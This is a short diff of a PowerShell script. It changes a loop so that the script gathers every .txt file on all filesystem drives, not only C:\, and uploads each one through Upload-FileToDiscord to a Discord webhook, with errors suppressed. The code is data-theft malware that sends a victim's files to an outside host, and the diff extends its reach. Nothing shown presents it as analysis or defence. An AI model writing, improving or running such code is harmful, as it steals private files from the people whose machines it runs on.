@@ -44,9 +44,10 @@ function Upload-FileToDiscord {
     $webResponse.Close()
 }
 
-# Get all .txt files in the system
-$txtFiles = Get-ChildItem -Path C:\ -Filter *.txt -Recurse -ErrorAction SilentlyContinue
-
-foreach ($file in $txtFiles) {
-    Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
+# Recursively get all .txt files from all drives
+$drives = Get-PSDrive -PSProvider FileSystem
+foreach ($drive in $drives) {
+    Get-ChildItem -Path $drive.Root -Filter *.txt -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+        Upload-FileToDiscord -filePath $_.FullName -webhookUrl $webhookUrl
+    }
 }
